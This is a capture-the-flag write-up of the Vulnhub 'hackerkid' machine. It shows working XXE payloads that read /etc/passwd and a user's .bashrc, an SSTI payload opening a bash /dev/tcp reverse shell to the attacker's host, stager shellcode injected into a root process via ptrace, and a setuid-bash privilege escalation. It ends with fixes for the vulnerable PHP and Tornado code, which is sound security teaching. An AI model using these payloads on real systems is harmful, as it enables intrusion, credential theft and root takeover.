---
title: Vulnhub - hackerkid writeup (Linux/Medium)
categories: [Vulnhub]
tags: [Vulnhub, ffuf, dig, Tornado, php, XXE, SSTI, cap_sys_ptrace, ptrace, stager, process injection, so file injection, LIBXML_DTLOAD, LIBXML_NOENT, libxml_disable_entity_loader, LIBXML_NONET]
render_with_liquid: false
---

for this box, I exploited an `XXE` to get web credentials for `tornado`, then achieved code execution trough exploiting an `SSTI`, after getting a shell I injected a stager shellcode I wrote into a root process with python to get a root shell

## Reconnaissance

I have setup the machine to run with bridge networking mode, then I’ve run a `/24` `nmap` scan to find the machine’s IP (`10.85.90.170`), then another scan to determine the open ports and running services, from there I found 3 services, A `DNS` service running on port `53` and the OS appears to be `Ubuntu`, `Apache` running on port `80` , and another Web server `Tornado` running on port 9999

```bash
# Nmap scan

[ arch@jeff | ~ ]
$ nmap -sn 10.85.90.10/24 -T5
[sudo] password for jeff:
Starting Nmap 7.97 ( <https://nmap.org> ) at 2025-08-17 19:29 +0100
Nmap scan report for 10.85.90.170
Host is up (0.00046s latency).
MAC Address: 08:00:27:E5:37:5F (Oracle VirtualBox virtual NIC)
Nmap scan report for 10.85.90.10
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 108.04 seconds
```

```bash
# Nmap port scan

[ arch@jeff | ~ ]
$ nmap -sS -sV -sC 10.85.90.170 -oA box
Starting Nmap 7.97 ( <https://nmap.org> ) at 2025-08-17 19:34 +0100
Nmap scan report for 10.85.90.170
Host is up (0.00030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Notorious Kid : A Hacker
9999/tcp open  http    Tornado httpd 6.1
| http-title: Please Log In
|_Requested resource was /login?next=%2F
|_http-server-header: TornadoServer/6.1
MAC Address: 08:00:27:E5:37:5F (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 15.03 seconds
```

## Identifying subdomains

Having a look at the page `Tornado` was serving , It was asking for user credentials from the get go, while `Apache` was serving a page with the note to `DIG DEEPER`
![dig_deeper.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/dig_deeper.png)

Checking the source code there was an HTTP parameter that I could fuzz to get a hidden page

![hidden_http_param.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/hidden_http_param.png)

I created a word list containing numbers from `0` to `10000` and used them to fuzz the `page_no` parameter, then I found a hidden page with `page_no=21` 

```bash
[ arch@jeff | /tmp/lab ]
$ seq 0 10000 > wordlist
(19:56:46) [ arch@jeff | /tmp/lab ]
$ ffuf -u "http://10.85.90.170/?page_no=FUZZ" -w wordlist -ac

        /'___\\  /'___\\           /'___\\
       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : <http://10.85.90.170/?page_no=FUZZ>
 :: Wordlist         : FUZZ: /tmp/lab/wordlist
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 3654
________________________________________________

21                      [Status: 200, Size: 3849, Words: 639, Lines: 117, Duration: 3ms]
:: Progress: [10001/10001] :: Job [1/1] :: 5405 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Visiting that page gave me the website’s domain as well as an additional subdomain `hackers.blackhat.local` , which didn’t have any page hosted, but looking it up using the target machine’s `DNS` server reveals an additional subdomain : `hackerkid.blackhat.local`

```bash
[ arch@jeff | ~ ]
$ dig hackers.blackhat.local @10.85.90.170

; <<>> DiG 9.20.11 <<>> hackers.blackhat.local @10.85.90.170
;; global options: +cmd
;; Got answer:
;; WARNING: .local is reserved for Multicast DNS
;; You are currently testing what happens when an mDNS query is leaked to DNS
;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 23924
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 42e710b481e613460100000068a227e20428649258a4a1a9 (good)
;; QUESTION SECTION:
;hackers.blackhat.local.		IN	A

;; AUTHORITY SECTION:
blackhat.local.		3600	IN	SOA	blackhat.local. hackerkid.blackhat.local. 1 10800 3600 604800 3600

;; Query time: 1 msec
;; SERVER: 10.85.90.170#53(10.85.90.170) (UDP)
;; WHEN: Sun Aug 17 20:45:38 +01 2025
;; MSG SIZE  rcvd: 125
```

## Getting credentials for Tornado

I saved the newly discovered subdomains to my `/etc/hosts` and visited `hackerkid.blackhat.local` which had a simple form, with one of the inputs reflecting back in the response

![xml_form.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/xml_form.png)

You could see from the page’s source that it’s sending `xml` data with `xml version="1.0"` to a `php` endpoint

![xml_src.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/xml_src.png)

Inspecting the request with `burpsuite`, we can change the xml data and trigger `XXE` to read an arbitrary file from the system, starting with `/etc/passwd` with the following `xml` payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>
	<name>jeff1</name>
	<tel>jeff2</tel>
	<email>&test;etc</email>
	<password>jeff1</password>
</root>
```

![etc_passwd.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/etc_passwd.png)

One interesting entry is the following:

```jsx
saket:x:1000:1000:Ubuntu,,,:/home/saket:/bin/bash
```

Which tells us we can look further under `saket`’s home directory for secrets in `~/.bashrc` , `~/.bash_history` ..

A simple `file:///home/saket/.bashrc` didn’t work but with the help of `php`base64 convert wrapper I could get the file and find some credentials inside, along with a note that the the other app is being server with `python`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=/home/saket/.bashrc">]>
<root>
	<name>jeff1</name>
	<tel>jeff2</tel>
	<email>&test;etc</email>
	<password>jeff1</password>
</root>
```

![php_wrappers.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/php_wrappers.png)

```bash
$ base64 -d bashrc_base64 | tail -n3
#Setting Password for running python app
username="admin"
password="Saket!#$%@!!"
```

## Foothold

![tornado.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/tornado.png)

Back to the python server running on `9999` , previous credentials combination didn’t work, until I replaced the username with `saket` then I got in, and the page was asking for a name
![whats_your_name.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/whats_your_name.png)

I tried supplying a name through the `HTTP` `name` parameter and it got reflected back, then I found that I can trigger a server side template injection with it

![ssti.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/ssti.png)

since the app was running `python` I tried (`?name={% import os %}{{ os.popen("id").read() }}`) and it worked
![ssti_code_exec.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/ssti_code_exec.png)

Next thing I did was to get a reverse shell using the payload :

```python
?name=%7b%25%20%69%6d%70%6f%72%74%20%6f%73%20%25%7d%7b%7b%20%6f%73%2e%70%6f%70%65%6e%28%22%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%38%35%2e%39%30%2e%31%30%2f%31%30%30%30%30%20%30%3e%26%31%27%22%29%7d%7d
```

Which is just a url encoding of the following:

```python
?name={% import os %}{{ os.popen("bash -c 'bash -i >& /dev/tcp/10.85.90.10/10000 0>&1'")}} 
```

# Getting root, the noisy way

Once I stabilized my reverse shell, I tried looking for `setuid` binaries and other potential paths to root, eventually I found that `/usr/bin/python2.7` has been granted `cap_sys_ptrace` capability

```bash
saket@ubuntu:~$ /sbin/getcap -r / 2>/dev/null
/snap/snapd/24792/usr/lib/snapd/snap-confine = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin+p
/snap/core22/2045/usr/bin/ping = cap_net_raw+ep
/usr/bin/python2.7 = cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

`Ptrace` is a system call that lets a process control another, and it’s what debuggers are built on, this means I can do anything a debugger can do to any running process, including inspecting registers, injecting shellcode or a shared library to achieve code execution

Looking at non-critical process running as root with `ps aux | awk '$1 == "root"' | grep -Ev '[0-9] \[.*\]'` , we can pick any process as our target, mine was `acpid`

```bash
saket@ubuntu:~$ ps aux | awk '$1 == "root"' | grep -Ev '[0-9] \[.*\]'
root           1  0.1  0.3 170976 13048 ?        Ss   05:15   0:01 /sbin/init auto noprompt
root         336  0.0  0.3  37556 13424 ?        S<s  05:16   0:00 /lib/systemd/systemd-journald
root         368  0.0  0.1  23696  7112 ?        Ss   05:16   0:00 /lib/systemd/systemd-udevd
root         609  0.0  0.2 250536  9300 ?        Ssl  05:16   0:00 /usr/lib/accountsservice/accounts-daemon
root         610  0.0  0.0   2548   776 ?        Ss   05:16   0:00 /usr/sbin/acpid
root         614  0.0  0.0  18052  2772 ?        Ss   05:16   0:00 /usr/sbin/cron -f
root         621  0.0  0.5 273232 21260 ?        Ssl  05:16   0:00 /usr/sbin/NetworkManager --no-daemon
root         627  0.0  0.0  81836  3720 ?        Ssl  05:16   0:00 /usr/sbin/irqbalance --foreground
root         629  0.0  0.4  47960 20096 ?        Ss   05:16   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         635  0.0  0.2 239020 11544 ?        Ssl  05:16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root         654  0.0  0.1 244232  6040 ?        Ssl  05:16   0:00 /usr/libexec/switcheroo-control
root         665  0.0  0.2  16900  8516 ?        Ss   05:16   0:00 /lib/systemd/systemd-logind
root         667  0.0  0.3 395544 14108 ?        Ssl  05:16   0:00 /usr/lib/udisks2/udisksd
root         669  0.0  0.1  13688  5084 ?        Ss   05:16   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root         729  0.0  0.3 180448 12596 ?        Ssl  05:16   0:00 /usr/sbin/cups-browsed
root         801  0.0  0.2 240016 10704 ?        Ssl  05:16   0:00 /usr/sbin/ModemManager --filter-policy=strict
root         812  0.0  0.5 126484 22872 ?        Ssl  05:16   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         820  0.0  0.2 248116  8308 ?        Ssl  05:16   0:00 /usr/sbin/gdm3
root         829  0.0  0.2 175304  8964 ?        Sl   05:16   0:00 gdm-session-worker [pam/gdm-launch-environment]
root         843  0.0  0.4 199776 20012 ?        Ss   05:16   0:00 /usr/sbin/apache2 -k start
root         902  0.0  0.2  37076  8764 ?        Ss   05:16   0:00 /usr/sbin/cupsd -l
root        1047  0.0  0.2 261052  9744 ?        Ssl  05:16   0:00 /usr/lib/upower/upowerd
root        1602  0.1  2.3 457768 94432 ?        Ssl  05:21   0:00 /usr/libexec/fwupd/fwupd
root        1646  0.3  0.9 1996844 38236 ?       Ssl  05:21   0:02 /usr/lib/snapd/snapd
```

As for the shellcode I wrote the following position independent stager that executes a file located at `/tmp/s.sh`

```nasm
section .text
	global _start
_start:
	jmp .push_argv0

.pop_argv0:
	pop rdi         ; pop &argv[0] into rdi
	xor eax, eax
	push rax        ; **argv needs to be null terminated
	push rdi        ; push &argv[0] on the stack, creating a double pointer
	mov rsi, rsp    ; as sys_excve syscall requires valid **argv

.spawn:
	xor edx, edx    ; env = NULL
	push 59         ; sys_execve
	pop rax
	syscall

	push 60         ; sys_exit
	pop rax
	xor edi, edi    ; status_code = 0
	syscall

.push_argv0:
call .pop_argv0     ; push &argv[0] to the stack then jump to pop_argv0
arg0: db "/tmp/s.sh", 0x0
```

I assembled it on my machine, using some assembling functions I made before, and used a [shellcode extractor I wrote a few years ago](https://github.com/0x00Jeff/injectors) to extract the code from the `.text` section

```bash
(00:44:01) [ arch@jeff | ~/work/asm ]
$ type asm64
asm64 is a function
asm64 ()
{
    local arg;
    if [ $# == 0 ]; then
        arg="test";
    else
        arg=$(echo $1 | cut -d . -f 1);
    fi;
    assemble $arg elf64 && asmlink $arg elf_x86_64 && asmclean $arg
}
(00:44:05) [ arch@jeff | ~/work/asm ]
$ type assemble asmlink
assemble is a function
assemble ()
{
    nasm -f $2 $1.s -o $1.o -g -F dwarf && return 0 || return 1
}
asmlink is a function
asmlink ()
{
    ld -m $2 $1.o -o $1 && return 0 || return 1
}
(00:44:23) [ arch@jeff | ~/work/asm ]
$ asm64 shellcode.s
(00:46:30) [ arch@jeff | ~/work/asm ]
$ gcc extractor64.c -o extract
(00:46:36) [ arch@jeff | ~/work/asm ]
$ ./extract shellcode
\xeb\x16\x5f\x31\xc0\x50\x57\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05\x6a\x3c\x58\x31\xff\x0f\x05\xe8\xe5\xff\xff\xff\x2f\x74\x6d\x70\x2f\x73\x2e\x73\x68\x00
```

Then I used [this script from hacktricks](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html#cap_sys_ptrace) to inject the shellcode into `acpid` process to get a reverse shell as root

The script failed a lot due to a bug in the code, where sometimes `ptrace(PTRACE_ATTACH)` or `ptrace(PTRACE_GETREGS)` would fail so I made a little modification to make it repeatedly try to attach to the target process and get its registers till it works, to make the script more reliable

```c
# repeatedly try to Attach to the target process
while libc.ptrace(PTRACE_ATTACH, pid, None, None) == -1:
    pass
registers=user_regs_struct()

# try to retrieve the value stored in registers in a loop
while libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers)) == -1 or registers.rip == 0:
    print("Instruction Pointer: " + hex(registers.rip))
    print("detach : ", hex(libc.ptrace(PTRACE_DETACH, pid, None, None)))
    print("attach : ", hex(libc.ptrace(PTRACE_ATTACH, pid, None, None)))
```

It also needed the shellcode to be 4-bytes aligned, and mine was 39 bytes, so I had to prepend one `\x90` (`nop` opcode) to the shellcode

```bash
[ arch@jeff | ~/work/asm ]
$ ./extract shellcode | grep '\\\\' -o | wc -l
39 # one byte needed to be 4-bytes-aligned
```

Now the last step is to create the second stage, I wrote a script to copy `/bin/bash` to `/tmp/b` and give it a `setuid` bit so I can spawn a shell as root, then made the script executable

```bash
saket@ubuntu:~$ cat /tmp/s.sh
#!/bin/bash
cp /bin/bash /tmp/b
chmod +s /tmp/b
saket@ubuntu:~$ chmod +x /tmp/s.sh
```

Then I injected into `acpid`

```bash
saket@ubuntu:~$ /usr/bin/python2.7 inject.py 610
('libc', <CDLL 'libc.so.6', handle 7f26798da000 at 7f2679403690>)
Instruction Pointer: 0x0L
('detach : ', '0xffffffffffffffffL')
('attach : ', '0xffffffffffffffffL')
Instruction Pointer: 0x0L
('detach : ', '0x0L')
('attach : ', '0x0L')
Instruction Pointer: 0x7f94063080daL
Injecting Shellcode at: 0x7f94063080daL
Shellcode Injected!!
Final Instruction Pointer: 0x7f94063080dcL
saket@ubuntu:~$
```

And finally got my root shell

```bash
saket@ubuntu:~$ ls -l /tmp/b
-rwsr-sr-x 1 root root 1.2M Aug 19 16:32 /tmp/b
saket@ubuntu:~$ /tmp/b -p
b-5.0# whoami
root
```

# A more OPSEC-friendly way to get root

While injecting a shellcode serves our purpose just right, it overwrites the original code, and eventually causes the whole program to be replaced with an instance of another one (since the shellcode does a `sys_execve` syscall), this  not only causes suspicions from a blue teaming perspective, but also stops the original process from doing its job, there are a few better ways however:

- Use of `ptrace` python API to find a code cave in a running process, inject the shellcode there, have it save original execution context, then fork, and make the `sys_execve` syscall in the child, while the parent jumps back to the original `context.rip` ([I made something similar in assembly few years ago](https://github.com/0x00Jeff/ElfFileInfecters))
- Inject a shared library, with an `__attribute__((constructor))` function which to spawns a new thread, that initiates the connection such like [in here](https://github.com/ancat/gremlin/tree/master), as this doesn’t interfere with the main processes execution, I found that there is a python package called **`pyinjector`** that does the exact same thing, but most solutions I found were either buggy or only work with `python3`

For the sake of simplicity and writing this writeup, I chose to inject a shellcode in the simplest way possible, a `python2.7` POC wouldn’t be hard to implement

# Root cause analysis and bug fixes

## XXE

Looking back at the `xml` form we found earlier, it sent the data to a `process.php` file

```bash
bash-5.0# find / -type f -name process.php 2>/dev/null
/var/www/hackerkid.blackhat.local/process.php
bash-5.0# cat /var/www/hackerkid.blackhat.local/process.php
<?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$info = simplexml_import_dom($dom);
$name = $info->name;
$tel = $info->tel;
$email = $info->email;
$password = $info->password;

echo "Sorry, $email is not available !!!";
?>
```

A few things are done that led to the existence of XXE:

- using [the deprecated function](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php) `libxml_disable_entity_loader` to enable the ability to load external entities
- Allowing entity expansion (`LIBXML_NOENT`) as well as Allowing DTD processing (`LIBXML_DTDLOAD`). according to the docs using both values is discouraged, especially when used together
![LIBXML_DTDLOAD.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/LIBXML_DTDLOAD.png)
![LIBXML_NOENT.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/LIBXML_NOENT.png)
We can fix that the vulnerability by :

- Removing `LIBXML_NOENT | LIBXML_DTDLOAD` flags and replacing them with `LIBXML_NONET` to disallow loading network entities
- Removing `libxml_disable_entity_loader` call
- Escaping the output with `htmlspecialchars` as a measure, and optionally not reflecting the email on the output

New code should look like this:

```php
<?php
// Get raw XML input
$xmlfile = file_get_contents('php://input');

// Create DOMDocument safely
$dom = new DOMDocument();

// Load XML securely (no external entities, no DTDs, no network)
$dom->loadXML($xmlfile, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);

// Convert to SimpleXML
$info = simplexml_import_dom($dom);

// Extract values safely
$name = (string) $info->name;
$tel = (string) $info->tel;
$email = (string) $info->email;
$password = (string) $info->password;

// Echo output
echo "Sorry, " . htmlspecialchars($email, ENT_QUOTES, 'UTF-8') . " is not available !!!";
?> 
```

 Now trying the same payload that I used to extract `/etc/passwd` and it  doesn’t work anymore
![XXE_fixed.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/XXE_fixed.png)
## SSTI

I already know that server is running python, so we can use that to quickly find it

```php
bash-5.0# ps aux | grep python
root         600  0.0  0.4  47960 18996 ?        Ss   08:48   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
saket        655  0.5  0.5  43428 21412 ?        S    08:48   0:08 /usr/bin/python3 /opt/server.py
root         719  0.0  0.5 126484 20324 ?        Ssl  08:48   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
saket       1259  0.0  0.2  26508  8908 ?        S    08:51   0:00 python3 -c import pty;pty.spawn("/bin/bash")
saket       1344  0.0  0.2  26376  8948 ?        S    09:04   0:00 python3 -c import pty;pty.spawn("/bin/bash")
root        1460  0.0  0.0  17672   664 pts/0    S+   09:12   0:00 grep python
```

I can see there is a process running `/usr/bin/python3 /opt/server.py` , inspecting the source code, we can find the source of the vulnerability in the following section

```python
TEMPLATE = '''
<html>
 <head><title>
  Hello {{ name }} </title></head>
<body bgcolor='black'>
<center>
<font color='red'>
<br>
<br>
Hello FOO
</font>
<center>
<br>
<br><br><br><br><center>
<a href="/logout">logout</a>
</center>
</body>
</html>
'''

name = self.get_argument('name', '')
if name:
	template_data = TEMPLATE.replace("FOO",name)
  t = tornado.template.Template(template_data)
  self.write(t.generate(name=name))
```

The issues in the code are the following:

- It embeds the variable `name` directly into the template string (`TEMPLATE.replace("FOO", name)`)
- It generates the result without escaping any special characters

I can fix that by:

- Replace `hello FOO` with `Hello {{ name }}` then pass `name` as a template variable when generating the result
- Escape user input with `tornado.escape.xhtml_escape()` before rendering

And this is the result:

```python
TEMPLATE = '''
<html>
 <head><title>
  Hello {{ name }} </title></head>
<body bgcolor='black'>
<center>
<font color='red'>
<br>
<br>
Hello {{ name }}
</font>
<center>
<br>
<br><br><br><br><center>
<a href="/logout">logout</a>
</center>
</body>
</html>
'''

name = self.get_argument('name', '')
if name:
	# compile the template once
	t = tornado.template.Template(TEMPLATE)

	# render safely by passing user input as a variable
	self.write(t.generate(name=name))
```

and no more `SSTI` vulnerability
![STTI_no_more.png](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/refs/heads/master/assets/vulnhub/hackerkid/STTI_no_more.png)

